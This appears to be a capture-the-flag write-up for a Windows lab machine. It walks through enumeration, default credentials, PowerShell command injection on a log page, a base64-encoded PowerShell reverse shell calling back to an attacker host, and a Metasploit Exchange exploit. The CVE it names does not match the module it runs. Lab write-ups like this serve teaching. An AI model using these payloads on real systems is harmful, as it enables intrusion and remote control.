# Lookback Write-up: Easy

## Nmap

```
nmap -sC -sV -Pn <ip> -p-
```

Open ports:
- 80: http. Microsoft IIS httpd 10.0
- 443: ssl/https. Outlook
- 3389: ms-wbt-server Microsoft Terminal Services

## Nikto

```
nikto -h <ip>
```
Nikto found the following credentials **admin : admin**

## Gobuster: Fuzzing

```
gobuster fuzz -u https://WIN-12OUO7A66M7.thm.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k --exclude-length 0
```

Gobuster found the following directory: **https://WIN-12OUO7A66M7.thm.local/test**
Logging in with the previous credentials gave me the first flag.

## Getting a shell: log analyser page

Entering empty input into the page gives the following interesting output:
```
Get-Content : Access to the path 'C:\' is denied.
```

This revealed that powershell is being executed. Most inputs would fail as I wasn't authorised, so I tried to run another command with the pipe character to stack commands.

```
') | oh; & ls ('
```

This worked! I then found a powershell reverse shell and used this to get a shell
```
') | oh; & powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOQAuADIANwAuADIAMQA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== ('
```

I then found the second flag in the dev user's home directory

## Privilege escalation to root

Reading TODO.txt in dev's home directory gives some interesting information:
```
Install the Security Update for MS Exchange [TO BE DONE]
```

I found that the MS Exchange server is vulnerable to **CVE-2022-41082** by getting the version:
```
Get-Command Exsetup.exe | ForEach {$_.FileVersionInfo}
```

Then, I used metasploit to run the exploit with the email id found in TODO.txt and get the root shell. This gave me the final flag from the Administrator\Documents directory.

```
msfconsole
use exploit/windows/http/exchange_proxyshell_rce
(set LHOST and EMAIL)
exploit
```